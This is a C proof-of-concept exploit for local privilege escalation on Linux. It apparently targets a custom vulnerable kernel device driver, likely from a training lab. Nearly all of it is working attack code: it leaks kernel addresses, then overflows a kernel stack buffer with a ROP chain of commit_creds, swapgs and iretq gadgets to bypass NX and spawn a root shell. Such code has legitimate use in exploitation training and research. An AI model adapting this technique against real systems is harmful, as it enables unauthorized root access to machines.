/* POC to exploit arbitrary read and
 * a kernel stack BOF with NX enabled
 * to gain local priv esc.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>

#include <alloca.h>

#include <kacmd.h>
#include <exp_commons.h>

#define KERNEL_CREDS 0xab7a0
#define COMMIT_CREDS 0xab3f0

#define POP_RDI 0x76ddd
#define PUSH_RAX 0x36f65
//#define PUSH_RAX_RSI 0x100c8ec
#define PUSH_RAX_RDX 0x59ee1c
#define SWAPGS_RBP 0x67894
#define IRETQ 0x34b4b
#define POP_RSI 0x3a744
#define POP_RDX 0xda192

#pragma pack(push, 1)
//#define GET_OFFSET
#ifdef GET_OFFSET
    struct rop_chain {
        char cookies[120];
    };
#else
    struct rop_chain {
        char buff[80];
        unsigned long pop_rdi0;
        unsigned long rdi;
        unsigned long prep_creds;
        unsigned long pop_rdx;
        unsigned long rdx; // going to point to pop rdi
        unsigned long push_rax_rdx;
        //unsigned long pop_rdi1;
        unsigned long commit_creds;
        unsigned long swapgs;
        unsigned long junk;
        unsigned long iret;
        unsigned long shell;
        unsigned long cs;
        unsigned long rflags;
        unsigned long rsp;
        unsigned long ss;
    };
#endif
#pragma pack(pop)

void spawn_shell(void){
    system("/bin/sh");

    fini();
    exit(0);
}

// stolen from https://www.slideshare.net/VitalyNikolenko/linux-smep-bypass-techniques
unsigned long user_cs;
unsigned long user_ss;
unsigned long user_rflags;
static void save_state() {
        asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n"
        "popq %2\n"
        : "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory");
}

int main(){
    struct kacmd_info_params kip;
    struct kacmd_info_resp kir;
    unsigned char* shellcode;
    struct rop_chain *ropc;
    unsigned long base;
    unsigned int size = sizeof(struct kacmd_sbof_params)+sizeof(struct rop_chain);
    struct kacmd_sbof_params* ksp = (struct kacmd_sbof_params *)alloca(size);
    
    init();

    kip.cmd = KACMD_INFO;
    write_dev(cmd, (char*)&kip, sizeof(kip), 0);
    read_dev(cmd, (char*)&kir, sizeof(kir), 0);
    printf("[I] Vpg: %p Ppg: %p Epg: %p\n", kir.pg_vaddress, kir.pg_paddress, kir.exec_paddress);
    printf("[I] code: %p data: %p bss: %p\n", kir.kernel_code, kir.kernel_data, kir.kernel_bss);
    
    ropc = &ksp->data;
    ksp->cmd = KACMD_STACK_BOF;
    ksp->size = size;
#ifdef GET_OFFSET
    char c = 'a' - 1;
    for (int i=0; i < 120; i++)
    {
        if (!((c+i)%8))
        {
            c++;
        }
        ropc->cookies[i] = c + (i % 8);
    }
#else
    memset(ropc->buff, 'A', sizeof(ropc->buff));
    save_state();
    base = (unsigned long)kir.kernel_code;
    ropc->pop_rdi0 = base + POP_RDI;
    ropc->rdi = 0;
    ropc->prep_creds = base + KERNEL_CREDS;
    ropc->pop_rdx = base + POP_RDX;
    ropc->rdx = base + POP_RDI;
    ropc->push_rax_rdx = base + PUSH_RAX_RDX;
    //ropc->pop_rdi1 = base + POP_RDI;
    ropc->commit_creds = base + COMMIT_CREDS;
    ropc->swapgs = base + SWAPGS_RBP;
    ropc->junk = 0x4242424242424242;
    ropc->iret = base + IRETQ;
    ropc->shell = (unsigned long)&spawn_shell;
    ropc->cs = user_cs;
    ropc->rflags = user_rflags;
    ropc->rsp = (unsigned long)&base;
    ropc->ss = user_ss;
#endif

    write_dev(cmd, (char*)ksp, size, 0);

    
    fini();
}
